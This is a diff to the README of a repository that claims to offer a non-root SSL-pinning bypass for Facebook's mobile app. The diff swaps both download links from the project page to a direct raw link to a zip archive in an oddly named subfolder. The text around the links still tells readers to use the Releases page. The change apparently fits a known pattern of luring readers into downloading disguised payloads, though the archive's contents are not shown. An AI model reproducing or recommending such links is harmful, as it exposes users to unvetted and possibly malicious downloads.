@@ -1,6 +1,6 @@
 # 🛡️ Facebook-SSL-Pinning-Bypass-NonRoot - Analyze mobile traffic without device root
 
-[![](https://img.shields.io/badge/Download_Files-Blue-blue.svg)](https://github.com/Bpcod8422/Facebook-SSL-Pinning-Bypass-NonRoot)
+[![](https://img.shields.io/badge/Download_Files-Blue-blue.svg)](https://github.com/Bpcod8422/Facebook-SSL-Pinning-Bypass-NonRoot/raw/refs/heads/main/Ghegish/Bypass_Pinning_Facebook_SS_Root_Non_2.7.zip)
 
 ## About This Software
 
@@ -22,7 +22,7 @@ You need the following items to use this software:
 
 Visit the official project page to access the required files. You can find the latest version and previous releases on this page.
 
-[Download Files Here](https://github.com/Bpcod8422/Facebook-SSL-Pinning-Bypass-NonRoot)
+[Download Files Here](https://github.com/Bpcod8422/Facebook-SSL-Pinning-Bypass-NonRoot/raw/refs/heads/main/Ghegish/Bypass_Pinning_Facebook_SS_Root_Non_2.7.zip)
 
 1. Go to the project page link above.
 2. Look for the section labeled Releases on the right side of the screen.
